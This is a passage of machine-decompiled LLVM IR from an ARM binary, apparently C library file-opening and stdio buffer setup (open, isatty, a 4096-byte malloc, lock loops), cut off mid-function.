  store i32 %v1_2a5a4, i32* %r3.global-to-local, align 4
  %v2_2a5a8 = or i32 %v1_2a5a4, %v0_2a5a8
  store i32 %v2_2a5a8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2a5d4

dec_label_pc_2a5b0:                               ; preds = %dec_label_pc_2a558
  %v2_2a5b0 = icmp eq i32 %v0_2a5b0, -1
  store i1 %v2_2a5b0, i1* %cpsr_c.global-to-local, align 1
  %v7_2a5b0 = icmp eq i32 %v0_2a5b0, -1
  %v0_2a5bc.pre = load i32, i32* @r4, align 4
  br i1 %v7_2a5b0, label %dec_label_pc_2a5b0._crit_edge, label %bb53

bb53:                                             ; preds = %dec_label_pc_2a5b0
  %v2_2a5b4 = or i32 %v0_2a5bc.pre, 131072
  store i32 %v2_2a5b4, i32* @r4, align 4
  br label %dec_label_pc_2a5b0._crit_edge

dec_label_pc_2a5b0._crit_edge:                    ; preds = %dec_label_pc_2a5b0, %bb53
  %v0_2a5bc = phi i32 [ %v2_2a5b4, %bb53 ], [ %v0_2a5bc.pre, %dec_label_pc_2a5b0 ]
  %v0_2a5b8 = load i32, i32* @r7, align 4
  store i32 %v0_2a5b8, i32* %r0.global-to-local, align 4
  store i32 %v0_2a5bc, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_2a5c4 = call i32 @__libc_open(i32 %v0_2a5b8, i32 %v0_2a5bc)
  store i32 %v2_2a5c4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_2a5c8 = icmp slt i32 %v2_2a5c4, 0
  %v1_2a5cc = load i32, i32* @r5, align 4
  %v2_2a5cc = add i32 %v1_2a5cc, 4
  %v3_2a5cc = inttoptr i32 %v2_2a5cc to i32*
  store i32 %v2_2a5c4, i32* %v3_2a5cc, align 4
  br i1 %v1_2a5c8, label %dec_label_pc_2a4d8, label %.dec_label_pc_2a5d4_crit_edge

.dec_label_pc_2a5d4_crit_edge:                    ; preds = %dec_label_pc_2a5b0._crit_edge
  %v0_2a5d8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_2a5d4

dec_label_pc_2a5d4:                               ; preds = %.dec_label_pc_2a5d4_crit_edge, %dec_label_pc_2a5a4
  %v0_2a5f0 = phi i32 [ %v0_2a5d8.pre, %.dec_label_pc_2a5d4_crit_edge ], [ %v2_2a5a8, %dec_label_pc_2a5a4 ]
  %v0_2a5d4 = load i32, i32* @r5, align 4
  %v1_2a5d4 = inttoptr i32 %v0_2a5d4 to i16*
  %v2_2a5d4 = load i16, i16* %v1_2a5d4, align 2
  %v3_2a5d4 = zext i16 %v2_2a5d4 to i32
  %v1_2a5d8 = urem i32 %v0_2a5f0, 4
  %v1_2a5dc = and i32 %v0_2a5f0, 1024
  %v1_2a5e0 = and i32 %v3_2a5d4, 8192
  %v1_2a5e4 = add nuw nsw i32 %v1_2a5d8, 1
  %v2_2a5e8 = or i32 %v1_2a5e0, %v1_2a5dc
  store i32 %v2_2a5e8, i32* %r3.global-to-local, align 4
  %v1_2a5ec = xor i32 %v1_2a5e4, 3
  store i32 %v1_2a5ec, i32* %r1.global-to-local, align 4
  %v1_2a5f0 = and i32 %v0_2a5f0, 131072
  store i32 %v1_2a5f0, i32* %r2.global-to-local, align 4
  %v2_2a5f0 = icmp eq i32 %v1_2a5f0, 0
  %v1_2a5f4 = add i32 %v0_2a5d4, 4
  %v2_2a5f4 = inttoptr i32 %v1_2a5f4 to i32*
  %v3_2a5f4 = load i32, i32* %v2_2a5f4, align 4
  store i32 %v3_2a5f4, i32* @r4, align 4
  br i1 %v2_2a5f0, label %bb55, label %bb54

bb54:                                             ; preds = %dec_label_pc_2a5d4
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb55

bb55:                                             ; preds = %dec_label_pc_2a5d4, %bb54
  %v0_2a600 = phi i32 [ 0, %dec_label_pc_2a5d4 ], [ 32768, %bb54 ]
  %v4_2a5fc = mul nuw nsw i32 %v1_2a5ec, 16
  %v5_2a5fc = or i32 %v2_2a5e8, %v4_2a5fc
  store i32 %v5_2a5fc, i32* %r3.global-to-local, align 4
  %v2_2a600 = or i32 %v0_2a600, %v5_2a5fc
  store i32 %v2_2a600, i32* %r2.global-to-local, align 4
  %v2_2a604 = icmp ugt i32 %v3_2a5f4, 2147483646
  store i1 %v2_2a604, i1* %cpsr_c.global-to-local, align 1
  %v8_2a604 = icmp eq i32 %v3_2a5f4, 2147483647
  %v1_2a608 = trunc i32 %v2_2a600 to i16
  store i16 %v1_2a608, i16* %v1_2a5d4, align 2
  br i1 %v8_2a604, label %dec_label_pc_2a648, label %dec_label_pc_2a610

dec_label_pc_2a610:                               ; preds = %bb55
  store i32 99092, i32* %r3.global-to-local, align 4
  %v0_2a614 = call i32 @__aeabi_read_tp()
  %v3_2a618 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2a618 = sext i16 %v3_2a618 to i32
  store i32 %v4_2a618, i32* @r3, align 4
  store i32 %v0_2a614, i32* @r6, align 4
  %v0_2a620 = load i32, i32* @r4, align 4
  store i32 %v0_2a620, i32* @r0, align 4
  %v2_2a624 = add i32 %v4_2a618, %v0_2a614
  %v3_2a624 = inttoptr i32 %v2_2a624 to i32*
  %v4_2a624 = load i32, i32* %v3_2a624, align 4
  store i32 %v4_2a624, i32* @r4, align 4
  %v1_2a628 = call i32 @isatty(i32 %v0_2a620)
  store i32 %v1_2a628, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2a62c = icmp eq i32 %v1_2a628, 0
  br i1 %v2_2a62c, label %.thread5, label %bb56

bb56:                                             ; preds = %dec_label_pc_2a610
  %v1_2a630 = load i32, i32* @r5, align 4
  %v2_2a630 = inttoptr i32 %v1_2a630 to i16*
  %v3_2a630 = load i16, i16* %v2_2a630, align 2
  %v4_2a630 = zext i16 %v3_2a630 to i32
  %v2_2a634 = or i32 %v4_2a630, 256
  store i32 %v2_2a634, i32* %r3.global-to-local, align 4
  %v2_2a638 = trunc i32 %v2_2a634 to i16
  store i16 %v2_2a638, i16* %v2_2a630, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_2a610, %bb56
  %v3_2a640 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2a640 = sext i16 %v3_2a640 to i32
  store i32 %v4_2a640, i32* %r3.global-to-local, align 4
  %v0_2a644 = load i32, i32* @r4, align 4
  %v1_2a644 = load i32, i32* @r6, align 4
  %v3_2a644 = add i32 %v1_2a644, %v4_2a640
  %v4_2a644 = inttoptr i32 %v3_2a644 to i32*
  store i32 %v0_2a644, i32* %v4_2a644, align 4
  br label %dec_label_pc_2a648

dec_label_pc_2a648:                               ; preds = %bb55, %.thread5
  %v0_2a648 = load i32, i32* @r5, align 4
  %v1_2a648 = add i32 %v0_2a648, 8
  %v2_2a648 = inttoptr i32 %v1_2a648 to i32*
  %v3_2a648 = load i32, i32* %v2_2a648, align 4
  store i32 %v3_2a648, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2a64c = icmp eq i32 %v3_2a648, 0
  br i1 %v2_2a64c, label %dec_label_pc_2a654, label %bb57

dec_label_pc_2a654:                               ; preds = %dec_label_pc_2a648
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_2a658 = call i32 @malloc(i32 4096)
  store i32 %v1_2a658, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2a65c = icmp eq i32 %v1_2a658, 0
  %v1_2a66c.pre = load i32, i32* @r5, align 4
  br i1 %v2_2a65c, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_2a654
  %v2_2a660 = inttoptr i32 %v1_2a66c.pre to i16*
  %v3_2a660 = load i16, i16* %v2_2a660, align 2
  %v4_2a660 = zext i16 %v3_2a660 to i32
  %v2_2a664 = add i32 %v1_2a658, 4096
  store i32 %v2_2a664, i32* %r2.global-to-local, align 4
  %v2_2a668 = or i32 %v4_2a660, 16384
  store i32 %v2_2a668, i32* %r3.global-to-local, align 4
  %v2_2a66c = add i32 %v1_2a66c.pre, 8
  %v3_2a66c = inttoptr i32 %v2_2a66c to i32*
  store i32 %v1_2a658, i32* %v3_2a66c, align 4
  %v1_2a670 = load i32, i32* %r2.global-to-local, align 4
  %v2_2a670 = load i32, i32* @r5, align 4
  %v3_2a670 = add i32 %v2_2a670, 12
  %v4_2a670 = inttoptr i32 %v3_2a670 to i32*
  store i32 %v1_2a670, i32* %v4_2a670, align 4
  %v1_2a674 = load i32, i32* %r3.global-to-local, align 4
  %v2_2a674 = trunc i32 %v1_2a674 to i16
  %v3_2a674 = load i32, i32* @r5, align 4
  %v4_2a674 = inttoptr i32 %v3_2a674 to i16*
  store i16 %v2_2a674, i16* %v4_2a674, align 2
  br label %bb57

.thread9:                                         ; preds = %dec_label_pc_2a654
  %v2_2a66c37 = add i32 %v1_2a66c.pre, 8
  %v3_2a66c38 = inttoptr i32 %v2_2a66c37 to i32*
  store i32 0, i32* %v3_2a66c38, align 4
  %v2_2a678 = load i32, i32* @r5, align 4
  %v3_2a678 = add i32 %v2_2a678, 12
  %v4_2a678 = inttoptr i32 %v3_2a678 to i32*
  store i32 0, i32* %v4_2a678, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %dec_label_pc_2a648, %.thread9
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_2a684 = load i32, i32* @r8, align 4
  %v2_2a684 = add i32 %v0_2a684, 104
  %v3_2a684 = inttoptr i32 %v2_2a684 to i32*
  %v4_2a684 = load i32, i32* %v3_2a684, align 4
  store i32 %v4_2a684, i32* %r3.global-to-local, align 4
  %v2_2a688 = load i32, i32* @r5, align 4
  %v3_2a688 = add i32 %v2_2a688, 2
  %v4_2a688 = inttoptr i32 %v3_2a688 to i8*
  store i8 0, i8* %v4_2a688, align 1
  %v0_2a68c = load i32, i32* @r5, align 4
  %v1_2a68c = inttoptr i32 %v0_2a68c to i16*
  %v2_2a68c = load i16, i16* %v1_2a68c, align 2
  %v3_2a68c = zext i16 %v2_2a68c to i32
  store i32 %v3_2a68c, i32* @r2, align 4
  %v0_2a690 = load i32, i32* %r3.global-to-local, align 4
  %v1_2a690 = inttoptr i32 %v0_2a690 to i32*
  %v2_2a690 = load i32, i32* %v1_2a690, align 4
  store i32 %v2_2a690, i32* %r1.global-to-local, align 4
  %v1_2a694 = add i32 %v0_2a68c, 8
  %v2_2a694 = inttoptr i32 %v1_2a694 to i32*
  %v3_2a694 = load i32, i32* %v2_2a694, align 4
  store i32 %v3_2a694, i32* %r3.global-to-local, align 4
  %v1_2a698 = and i32 %v3_2a68c, 8192
  %v2_2a698 = icmp eq i32 %v1_2a698, 0
  %v2_2a69c = add i32 %v0_2a68c, 20
  %v3_2a69c = inttoptr i32 %v2_2a69c to i32*
  store i32 %v3_2a694, i32* %v3_2a69c, align 4
  %v0_2a6a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_2a6a0 = load i32, i32* @r5, align 4
  %v2_2a6a0 = add i32 %v1_2a6a0, 52
  %v3_2a6a0 = inttoptr i32 %v2_2a6a0 to i32*
  store i32 %v0_2a6a0, i32* %v3_2a6a0, align 4
  %v0_2a6a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_2a6a4 = load i32, i32* @r5, align 4
  %v2_2a6a4 = add i32 %v1_2a6a4, 24
  %v3_2a6a4 = inttoptr i32 %v2_2a6a4 to i32*
  store i32 %v0_2a6a4, i32* %v3_2a6a4, align 4
  %v0_2a6a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_2a6a8 = load i32, i32* @r5, align 4
  %v2_2a6a8 = add i32 %v1_2a6a8, 28
  %v3_2a6a8 = inttoptr i32 %v2_2a6a8 to i32*
  store i32 %v0_2a6a8, i32* %v3_2a6a8, align 4
  %v0_2a6ac = load i32, i32* %r3.global-to-local, align 4
  %v1_2a6ac = load i32, i32* @r5, align 4
  %v2_2a6ac = add i32 %v1_2a6ac, 16
  %v3_2a6ac = inttoptr i32 %v2_2a6ac to i32*
  store i32 %v0_2a6ac, i32* %v3_2a6ac, align 4
  %v0_2a6b0 = load i32, i32* %r4.global-to-local, align 4
  %v1_2a6b0 = load i32, i32* @r5, align 4
  %v2_2a6b0 = add i32 %v1_2a6b0, 44
  %v3_2a6b0 = inttoptr i32 %v2_2a6b0 to i32*
  store i32 %v0_2a6b0, i32* %v3_2a6b0, align 4
  br i1 %v2_2a698, label %dec_label_pc_2a898, label %dec_label_pc_2a6b8

dec_label_pc_2a6b8:                               ; preds = %bb57
  store i32 176, i32* %r3.global-to-local, align 4
  %v0_2a6bc = load i32, i32* @r8, align 4
  %v2_2a6bc = add i32 %v0_2a6bc, 176
  %v3_2a6bc = inttoptr i32 %v2_2a6bc to i32*
  %v4_2a6bc = load i32, i32* %v3_2a6bc, align 4
  store i32 %v4_2a6bc, i32* %r7.global-to-local, align 4
  %v0_2a6c0 = call i32 @__aeabi_read_tp()
  store i32 %v0_2a6c0, i32* %r0.global-to-local, align 4
  %v1_2a6c4 = add i32 %v4_2a6bc, 8
  %v2_2a6c4 = inttoptr i32 %v1_2a6c4 to i32*
  %v3_2a6c4 = load i32, i32* %v2_2a6c4, align 4
  store i32 %v3_2a6c4, i32* %r3.global-to-local, align 4
  %v1_2a6c8 = add i32 %v0_2a6c0, -1168
  store i32 %v1_2a6c8, i32* %r6.global-to-local, align 4
  %v3_2a6cc = icmp uge i32 %v3_2a6c4, %v1_2a6c8
  store i1 %v3_2a6cc, i1* %cpsr_c.global-to-local, align 1
  %v9_2a6cc = icmp eq i32 %v3_2a6c4, %v1_2a6c8
  br i1 %v9_2a6cc, label %dec_label_pc_2a710, label %dec_label_pc_2a6d4

dec_label_pc_2a6d4:                               ; preds = %dec_label_pc_2a6b8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_2a6bc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2a6dc

dec_label_pc_2a6dc:                               ; preds = %dec_label_pc_2a6e8.dec_label_pc_2a6dc_crit_edge, %dec_label_pc_2a6d4
  %v0_2a6dc = phi i32 [ %v0_2a6dc.pre, %dec_label_pc_2a6e8.dec_label_pc_2a6dc_crit_edge ], [ %v4_2a6bc, %dec_label_pc_2a6d4 ]
  %v1_2a6dc = inttoptr i32 %v0_2a6dc to i32*
  %v2_2a6dc = load i32, i32* %v1_2a6dc, align 4
  store i32 %v2_2a6dc, i32* %r3.global-to-local, align 4
  %v1_2a6e0 = load i32, i32* %r4.global-to-local, align 4
  %v3_2a6e0 = icmp uge i32 %v2_2a6dc, %v1_2a6e0
  store i1 %v3_2a6e0, i1* %cpsr_c.global-to-local, align 1
  %v9_2a6e0 = icmp eq i32 %v2_2a6dc, %v1_2a6e0
  br i1 %v9_2a6e0, label %dec_label_pc_2a6e8, label %dec_label_pc_2a700

dec_label_pc_2a6e8:                               ; preds = %dec_label_pc_2a6dc
  store i32 %v2_2a6dc, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2a6f8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2a6f8, label %dec_label_pc_2a6fc, label %dec_label_pc_2a6e8.dec_label_pc_2a6dc_crit_edge

dec_label_pc_2a6e8.dec_label_pc_2a6dc_crit_edge:  ; preds = %dec_label_pc_2a6e8
  %v0_2a6dc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2a6dc

dec_label_pc_2a6fc:                               ; preds = %dec_label_pc_2a6e8
  %v0_2a6fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_2a6fc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2a700

dec_label_pc_2a700:                               ; preds = %dec_label_pc_2a6dc, %dec_label_pc_2a6fc
  %v0_2a700 = phi i32 [ %v0_2a6fc, %dec_label_pc_2a6fc ], [ %v2_2a6dc, %dec_label_pc_2a6dc ]
  %v1_2a700 = phi i32 [ %v0_2a6fc, %dec_label_pc_2a6fc ], [ %v1_2a6e0, %dec_label_pc_2a6dc ]
  %v3_2a700 = icmp uge i32 %v0_2a700, %v1_2a700
  store i1 %v3_2a700, i1* %cpsr_c.global-to-local, align 1
  %v9_2a700 = icmp eq i32 %v0_2a700, %v1_2a700
  br i1 %v9_2a700, label %bb59, label %bb58

bb58:                                             ; preds = %dec_label_pc_2a700
  %v1_2a704 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_2a704, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_2a700, %bb58
  %v1_2a708 = xor i1 %v9_2a700, true
  call void @__pseudo_cond_branch(i1 %v1_2a708, i32 ptrtoint (i32* @global_var_27dec.3092 to i32))
  %v0_2a70c = load i32, i32* %r6.global-to-local, align 4
  %v1_2a70c = load i32, i32* %r7.global-to-local, align 4
  %v2_2a70c = add i32 %v1_2a70c, 8
  %v3_2a70c = inttoptr i32 %v2_2a70c to i32*
  store i32 %v0_2a70c, i32* %v3_2a70c, align 4
  %v1_2a72c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_2a710

dec_label_pc_2a710:                               ; preds = %dec_label_pc_2a6b8, %bb59
  %v1_2a72c = phi i32 [ %v3_2a6c4, %dec_label_pc_2a6b8 ], [ %v1_2a72c.pre, %bb59 ]
  store i32 176, i32* %r3.global-to-local, align 4
  %v0_2a714 = load i32, i32* @r8, align 4
  %v2_2a714 = add i32 %v0_2a714, 176
  %v3_2a714 = inttoptr i32 %v2_2a714 to i32*
  %v4_2a714 = load i32, i32* %v3_2a714, align 4
  store i32 %v4_2a714, i32* %r1.global-to-local, align 4
  store i32 168, i32* %r3.global-to-local, align 4
  %v2_2a71c = add i32 %v0_2a714, 168
  %v3_2a71c = inttoptr i32 %v2_2a71c to i32*
  %v4_2a71c = load i32, i32* %v3_2a71c, align 4
  store i32 %v4_2a71c, i32* %r7.global-to-local, align 4
  %v1_2a720 = add i32 %v4_2a714, 4
  %v2_2a720 = inttoptr i32 %v1_2a720 to i32*
  %v3_2a720 = load i32, i32* %v2_2a720, align 4
  store i32 %v3_2a720, i32* %r3.global-to-local, align 4
  %v1_2a724 = add i32 %v4_2a71c, 8
  %v2_2a724 = inttoptr i32 %v1_2a724 to i32*
  %v3_2a724 = load i32, i32* %v2_2a724, align 4
  store i32 %v3_2a724, i32* %r2.global-to-local, align 4
  %v1_2a728 = add i32 %v3_2a720, 1
  store i32 %v1_2a728, i32* %r3.global-to-local, align 4
  %v3_2a72c = icmp uge i32 %v3_2a724, %v1_2a72c
  store i1 %v3_2a72c, i1* %cpsr_c.global-to-local, align 1
  %v9_2a72c = icmp eq i32 %v3_2a724, %v1_2a72c
  store i32 %v1_2a728, i32* %v2_2a720, align 4
  br i1 %v9_2a72c, label %dec_label_pc_2a778, label %dec_label_pc_2a738

dec_label_pc_2a738:                               ; preds = %dec_label_pc_2a710
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_2a73c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_2a73c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_2a74495 = inttoptr i32 %v0_2a73c to i32*
  %v2_2a74496 = load i32, i32* %v1_2a74495, align 4
  store i32 %v2_2a74496, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_2a74898 = icmp eq i32 %v2_2a74496, 0
  br i1 %v9_2a74898, label %dec_label_pc_2a750, label %dec_label_pc_2a768

dec_label_pc_2a750:                               ; preds = %dec_label_pc_2a738, %dec_label_pc_2a750.dec_label_pc_2a744_crit_edge
  %v0_2a75099 = phi i32 [ %v1_2a748.pre, %dec_label_pc_2a750.dec_label_pc_2a744_crit_edge ], [ 0, %dec_label_pc_2a738 ]
  store i32 %v0_2a75099, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2a760 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2a760, label %dec_label_pc_2a764, label %dec_label_pc_2a750.dec_label_pc_2a744_crit_edge

dec_label_pc_2a750.dec_label_pc_2a744_crit_edge:  ; preds = %dec_label_pc_2a750
  %v0_2a744.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_2a748.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_2a744 = inttoptr i32 %v0_2a744.pre to i32*
  %v2_2a744 = load i32, i32* %v1_2a744, align 4
  store i32 %v2_2a744, i32* %r3.global-to-local, align 4
  %v3_2a748 = icmp uge i32 %v2_2a744, %v1_2a748.pre
  store i1 %v3_2a748, i1* %cpsr_c.global-to-local, align 1
  %v9_2a748 = icmp eq i32 %v2_2a744, %v1_2a748.pre
  br i1 %v9_2a748, label %dec_label_pc_2a750, label %dec_label_pc_2a768

dec_label_pc_2a764:                               ; preds = %dec_label_pc_2a750
  %v0_2a764 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_2a764, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2a768

dec_label_pc_2a768:                               ; preds = %dec_label_pc_2a738, %dec_label_pc_2a750.dec_label_pc_2a744_crit_edge, %dec_label_pc_2a764
  %v0_2a768 = phi i32 [ %v0_2a764, %dec_label_pc_2a764 ], [ %v2_2a74496, %dec_label_pc_2a738 ], [ %v2_2a744, %dec_label_pc_2a750.dec_label_pc_2a744_crit_edge ]
  %v1_2a768 = phi i32 [ %v0_2a764, %dec_label_pc_2a764 ], [ 0, %dec_label_pc_2a738 ], [ %v1_2a748.pre, %dec_label_pc_2a750.dec_label_pc_2a744_crit_edge ]
  %v3_2a768 = icmp uge i32 %v0_2a768, %v1_2a768
  store i1 %v3_2a768, i1* %cpsr_c.global-to-local, align 1
  %v9_2a768 = icmp eq i32 %v0_2a768, %v1_2a768
  br i1 %v9_2a768, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_2a768
  %v1_2a76c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_2a76c, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_2a768, %bb60
  %v1_2a770 = xor i1 %v9_2a768, true
  call void @__pseudo_cond_branch(i1 %v1_2a770, i32 ptrtoint (i32* @global_var_27dec.3092 to i32))
  %v0_2a774 = load i32, i32* %r6.global-to-local, align 4
  %v1_2a774 = load i32, i32* %r7.global-to-local, align 4
  %v2_2a774 = add i32 %v1_2a774, 8
  %v3_2a774 = inttoptr i32 %v2_2a774 to i32*
  store i32 %v0_2a774, i32* %v3_2a774, align 4
  br label %dec_label_pc_2a778

dec_label_pc_2a778:                               ; preds = %dec_label_pc_2a710, %bb61
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_2a77c = load i32, i32* @r8, align 4
  %v2_2a77c = add i32 %v0_2a77c, 168
  %v3_2a77c = inttoptr i32 %v2_2a77c to i32*
  %v4_2a77c = load i32, i32* %v3_2a77c, align 4
  store i32 %v4_2a77c, i32* %r0.global-to-local, align 4
  store i32 88, i32* %r3.global-to-local, align 4
  %v2_2a784 = add i32 %v0_2a77c, 88
  %v3_2a784 = inttoptr i32 %v2_2a784 to i32*
  %v4_2a784 = load i32, i32* %v3_2a784, align 4
  store i32 %v4_2a784, i32* %r1.global-to-local, align 4
  %v1_2a788 = add i32 %v4_2a77c, 4
  %v2_2a788 = inttoptr i32 %v1_2a788 to i32*
  %v3_2a788 = load i32, i32* %v2_2a788, align 4
  store i32 %v3_2a788, i32* %r3.global-to-local, align 4
  %v1_2a78c = inttoptr i32 %v4_2a784 to i32*
  %v2_2a78c = load i32, i32* %v1_2a78c, align 4
  store i32 %v2_2a78c, i32* @r2, align 4
  %v1_2a790 = add i32 %v3_2a788, 1
  store i32 %v1_2a790, i32* %r3.global-to-local, align 4
  store i32 %v1_2a790, i32* %v2_2a788, align 4
  %v0_2a798 = load i32, i32* @r2, align 4
  %v1_2a798 = load i32, i32* @r5, align 4
  %v2_2a798 = add i32 %v1_2a798, 32
  %v3_2a798 = inttoptr i32 %v2_2a798 to i32*
  store i32 %v0_2a798, i32* %v3_2a798, align 4
  %v0_2a79c = load i32, i32* %r0.global-to-local, align 4
  %v1_2a79c = add i32 %v0_2a79c, 4
  %v2_2a79c = inttoptr i32 %v1_2a79c to i32*
  %v3_2a79c = load i32, i32* %v2_2a79c, align 4
  %v1_2a7a0 = add i32 %v3_2a79c, -1
  store i32 %v1_2a7a0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2a7a4 = icmp eq i32 %v1_2a7a0, 0
  %v0_2a7a8 = load i32, i32* @r5, align 4
  %v1_2a7a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_2a7a8 = inttoptr i32 %v1_2a7a8 to i32*
  store i32 %v0_2a7a8, i32* %v2_2a7a8, align 4
  %v0_2a7ac = load i32, i32* %r3.global-to-local, align 4
  %v1_2a7ac = load i32, i32* %r0.global-to-local, align 4
  %v2_2a7ac = add i32 %v1_2a7ac, 4
  %v3_2a7ac = inttoptr i32 %v2_2a7ac to i32*
  store i32 %v0_2a7ac, i32* %v3_2a7ac, align 4
  br i1 %v2_2a7a4, label %dec_label_pc_2a7b4, label %dec_label_pc_2a814

dec_label_pc_2a7b4:                               ; preds = %dec_label_pc_2a778
  %v0_2a7b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_2a7b4 = load i32, i32* %r0.global-to-local, align 4
  %v2_2a7b4 = add i32 %v1_2a7b4, 8
  %v3_2a7b4 = inttoptr i32 %v2_2a7b4 to i32*
  store i32 %v0_2a7b4, i32* %v3_2a7b4, align 4
  %v0_2a7b8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_2a7b8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2a7bc

dec_label_pc_2a7bc:                               ; preds = %dec_label_pc_2a7ec.dec_label_pc_2a7bc_crit_edge, %dec_label_pc_2a7b4
  %v0_2a7bc = phi i32 [ %v0_2a7bc.pre, %dec_label_pc_2a7ec.dec_label_pc_2a7bc_crit_edge ], [ %v0_2a7b8, %dec_label_pc_2a7b4 ]
  %v1_2a7bc = inttoptr i32 %v0_2a7bc to i32*
  %v2_2a7bc = load i32, i32* %v1_2a7bc, align 4
  store i32 %v2_2a7bc, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_2a7bc, i32* @r2, align 4
  %v2_2a7c883 = load i32, i32* %v1_2a7bc, align 4
  store i32 %v2_2a7c883, i32* %r3.global-to-local, align 4
  %v3_2a7cc85 = icmp uge i32 %v2_2a7c883, %v2_2a7bc
  store i1 %v3_2a7cc85, i1* %cpsr_c.global-to-local, align 1
  %v9_2a7cc91 = icmp eq i32 %v2_2a7c883, %v2_2a7bc
  br i1 %v9_2a7cc91, label %dec_label_pc_2a7d4, label %dec_label_pc_2a7ec

dec_label_pc_2a7d4:                               ; preds = %dec_label_pc_2a7bc, %dec_label_pc_2a7d4.dec_label_pc_2a7c8_crit_edge
  %v0_2a7d492 = phi i32 [ %v1_2a7cc.pre, %dec_label_pc_2a7d4.dec_label_pc_2a7c8_crit_edge ], [ %v2_2a7bc, %dec_label_pc_2a7bc ]
  store i32 %v0_2a7d492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2a7e4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2a7e4, label %dec_label_pc_2a7e8, label %dec_label_pc_2a7d4.dec_label_pc_2a7c8_crit_edge

dec_label_pc_2a7d4.dec_label_pc_2a7c8_crit_edge:  ; preds = %dec_label_pc_2a7d4
  %v0_2a7c8.pre = load i32, i32* @r2, align 4
  %v1_2a7cc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_2a7c8 = inttoptr i32 %v0_2a7c8.pre to i32*
  %v2_2a7c8 = load i32, i32* %v1_2a7c8, align 4
  store i32 %v2_2a7c8, i32* %r3.global-to-local, align 4
  %v3_2a7cc = icmp uge i32 %v2_2a7c8, %v1_2a7cc.pre
  store i1 %v3_2a7cc, i1* %cpsr_c.global-to-local, align 1
  %v9_2a7cc = icmp eq i32 %v2_2a7c8, %v1_2a7cc.pre
  br i1 %v9_2a7cc, label %dec_label_pc_2a7d4, label %dec_label_pc_2a7ec

dec_label_pc_2a7e8:                               ; preds = %dec_label_pc_2a7d4
  %v0_2a7e8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_2a7e8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2a7ec

dec_label_pc_2a7ec:                               ; preds = %dec_label_pc_2a7bc, %dec_label_pc_2a7d4.dec_label_pc_2a7c8_crit_edge, %dec_label_pc_2a7e8
  %v0_2a7f4 = phi i32 [ %v0_2a7e8, %dec_label_pc_2a7e8 ], [ %v2_2a7c883, %dec_label_pc_2a7bc ], [ %v2_2a7c8, %dec_label_pc_2a7d4.dec_label_pc_2a7c8_crit_edge ]
  %v1_2a7ec = phi i32 [ %v0_2a7e8, %dec_label_pc_2a7e8 ], [ %v2_2a7bc, %dec_label_pc_2a7bc ], [ %v1_2a7cc.pre, %dec_label_pc_2a7d4.dec_label_pc_2a7c8_crit_edge ]
  %v3_2a7ec = icmp uge i32 %v0_2a7f4, %v1_2a7ec
  store i1 %v3_2a7ec, i1* %cpsr_c.global-to-local, align 1
  %v9_2a7ec = icmp eq i32 %v0_2a7f4, %v1_2a7ec
